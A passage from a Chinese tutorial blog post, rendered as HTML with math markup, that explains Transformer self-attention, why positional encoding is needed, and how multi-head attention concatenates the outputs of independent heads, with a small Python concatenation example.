aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 中所有行的加权组合，权重由 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">S[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> 决定。因此，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 不再是孤立的信息，而是融合了整个序列相关信息的“语境化”表示。</p>
<p>我们将以上的计算过程，就是通过输入<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，最后计算得到<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>的流程用如下图表示：（下图中的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>就是我们文中的输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>，后文中均用<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span>表示输出）</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d932f9130cde49e5a5f3eb2e21812d98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=GXmi1S4t0DRtJB65lh%2FaIgaOwyY%3D" alt="c10.jpg" loading="lazy"/></p>
<p>以上，就是“自注意力”的计算过程，我们可以将其封装为一个“自注意力(Self Attention)”模块，就如同上图所示。</p>
<p>至此，我们仅用几行清晰的矩阵运算，就完成了将输入序列 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 转换为上下文感知的输出序列 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> 的全部过程。非常的优雅、高效。</p>
<p>另外，这种方式相比传统的循环神经网络（LSTM，GRU等），效率提升了许多，为什么？RNN的核心是其循环结构。为了处理序列中的第 <code>t</code> 个元素，它必须等待第 <code>t-1</code> 个元素的隐状态计算完成。这种严格的<strong>时序依赖关系</strong>就像一条单行生产线，工序必须一个接一个进行。在训练时，这被称为“串行依赖”，意味着模型无法同时处理一个批次中所有序列位置的计算。这就意味着即使拥有强大的GPU，计算也必须按时间步展开，无法充分利用GPU成千上万个核心的并行能力。</p>
<p>而Transformer通过注意力机制，<strong>将序列中所有元素之间的关联计算，一次性表述为矩阵乘法</strong>。对于GPU来说，这是它最擅长处理的<strong>稠密矩阵运算</strong>，可以调用海量计算核心同时完成数以百万计的点积运算。而计算位置 <code>i</code> 与位置 <code>j</code> 的注意力权重，<strong>不再依赖于</strong>位置 <code>i-1</code> 或 <code>j-1</code> 的任何中间结果。这种设计彻底打破了时序枷锁。</p>
<hr/>
<p>相信认真读到这里的你，心中可能会浮现一个重要的疑问：<strong>序列数据中至关重要的时序信息去哪儿了？</strong> Transformer的“自注意力”机制似乎只专注于计算词与词之间的关联强度，却<strong>完全忽略了它们在序列中的相对位置或绝对距离</strong>。</p>
<p>举个例子，考虑以下两个句子：</p>
<ul>
<li>“<strong>我</strong>爱<strong>你</strong>”</li>
<li>“<strong>你</strong>爱<strong>我</strong>”</li>
</ul>
<p>这两个句子包含完全相同的词语。如果只依赖自注意力机制，模型为“爱”这个词计算出的上下文表示，在两个句子中可能会非常相似，因为它在两个句子里都与“我”和“你”发生了关联。然而，任何一个懂中文的人都知道，<strong>词语的顺序彻底改变了句子的含义</strong>。自注意力机制在计算时，并没有内置任何关于“我”在“你”之前还是之后的概念，它丢失了语言中这种根本性的<strong>时序结构</strong>。</p>
<p>**这是一个非常关键的洞察！**这是原始自注意力机制的一个核心局限：它本质上是一种置换不变操作。无论输入的词序如何打乱，只要词向量集合不变，自注意力计算出的输出集合在理论上就是不变的。这对于理解语言、代码、音乐等任何依赖顺序的结构来说是致命的缺陷。</p>
<p>不过，这个看似严重的缺陷早已被Transformer的设计者预见并优雅地解决了。解决方案就是在将词嵌入向量输入Transformer层之前，为它们注入<strong>位置信息</strong>，这个关键的模块称为<strong>位置编码（Positional Encoding）</strong>。具体做法是<strong>生成一个与词嵌入向量维度相同长度也相同的“位置向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>”，并将其与词嵌入向量相加</strong>。这个位置向量不是随机的，它必须能够唯一且有效地表征每个词在序列中的绝对位置（甚至相对位置）,如此一来，输入模型的就不再是单纯的词义向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，而是<strong>词义与位置信息的融合体</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i + p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。自注意力机制在此基础上计算关联时，就会自然而然地同时考虑“你是什么词”以及“你出现在哪里”这两重信息。</p>
<p>关于“位置编码”的深入剖析，我将其安排在了文末的附录章节，以便于主线阐述的连贯性，感兴趣的读者可随时参考。</p>
<hr/>
<p>至此，你已经掌握了Transformer最核心的动力单元——<strong>自注意力（Self-Attention）</strong>。它赋予了序列中每个元素“纵观全局”的能力。然而，一个真正强大的系统，绝不应满足于单一的观察视角。</p>
<p>如果只用一个自注意力机制，就好比只用一套固定的滤镜观察世界，它可能擅长捕捉某种模式，但会忽略其他同样重要的模式。</p>
<p>于是，<strong>多头注意力（Multi-Head Attention）</strong> 应运而生。它的设计哲学非常直观：<strong>与其让一个注意力机制勉力捕捉所有类型的关系，不如并行部署多个独立的注意力“头”，让每个头自由地、专业化地学习并关注序列中不同方面的依赖模式</strong>。</p>
<p>举个例子：将多头注意力想象成一个高级别的专家委员会。面对一份复杂的文件（输入序列），委员会主席（模型）不会只询问一位专家。相反，他会同时召集：</p>
<ul>
<li>一位法律专家（头1），审视条款间的逻辑与合规性；</li>
<li>一位财务专家（头2），分析数据间的勾稽关系；</li>
<li>一位技术专家（头3），评估方案实施的可行性。</li>
</ul>
<p>每位专家独立撰写自己的分析报告（每个头的输出）。最后，主席将所有报告汇总（拼接），并综合形成一份最终的决策文件。这种方式远比依赖单一专家的判断更为全面和稳健。</p>
<p>多头注意力的功能和“自注意力（self-Attention）”模块是一样的，本质依然是将一个序列转化为另一个序列。</p>
<p>既然是多头注意力，其实我们就可以想到了，就是多堆叠几个Self-Attention层就行了，有几个头，就有几个Self-Attention层。</p>
<p>假设我们有一个形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> 的输入矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>。现在，我们不再只使用一个自注意力层，而是准备 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span></span></span></span></span> 个（例如 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">h=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">4</span></span></span></span></span>）<strong>独立的</strong>自注意力层。每个层都有自己独有的、互不共享的三组权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>W</mi><mi>k</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>W</mi><mi>v</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">{W_q^{(i)}, W_k^{(i)}, W_v^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3461em;vertical-align:-0.3013em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2527em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.3987em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span></span></span>，其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">i=1,2,...,h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">h</span></span></span></span></span>。</p>
<p>我们将同一个输入 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 并行地送入这 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">h</span></span></span></span></span> 个自注意力层中，每个头都会输出一个形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> 的矩阵。接下来，我们将这些输出矩阵进行合并（也可以叫拼接）成一个新矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Z_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Z_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>的形状为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>×</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, out\_size \times h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span></span>；</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/895e4b581ef6472b899ed7513ba4e699~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=nwj75KDtxlyYWT5GOzlbtjS8G7c%3D" alt="c11.jpg" width="100%" loading="lazy"/></p>
<p>当然，为了确保输入输出矩阵的特征/维度相同，在每个自注意层的输出时要把<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>设置为“<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">emb\_size/h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mord">/</span><span class="mord mathnormal">h</span></span></span></span></span>”</p>
<p>首先，还是再强调一下这个符号（圆圈内一竖）的意思，它就是合并操作(类似PyTorch中的 <code>torch.cat()</code> 或 NumPy 中的 <code>np.concatenate()</code>)，例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 假设有三个头，每个头输出维度为 out_size = 2</span>
Z_1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>],  
         [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>],   
         [<span class="hljs-number">1</span>, <span class="hljs-number">9</span>]]   

Z_2 = [[<span class="hljs-number">5</span>, <span class="hljs-number">9</span>],
         [<span class="hljs-number">8</span>, <span class="hljs-number">7</span>],
         [<span class="hljs-number">1</span>, <span class="hljs-number">6</span>]]

Z_3 = [[<span class="hljs-number">3</span>, <span class="hljs-number">0</span>],
         [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>],
         [<span class="hljs-number">4</span>, <span class="hljs-number">8</span>]]

<span class="hljs-comment"># 沿特征维度（dim=1）拼接</span>
Z_out =    [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>],  <span class="hljs-comment"># 位置1：融合了3个头的视角</span>
            [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>],  <span class="hljs-comment"># 位置2：融合了3个头的视角</span>
            [<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>]]  <span class="hljs-comment"># 位置3：融合了3个头的视角</span>
</code></pre>
<p>这就是多头注意力了，是不是非常简单！我们就可以将上面的这个算法流程封装成Multi Head Attention模块。</p>
<p><strong>小提示：如果你给每个自注意力层的注意力权重<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>加了掩码，那么封装成的多头注意力就叫做Masked Multi Head Attention。本质完全和Multi Head Attention一样，就是有无掩码的区别。</strong></p>
<hr/>
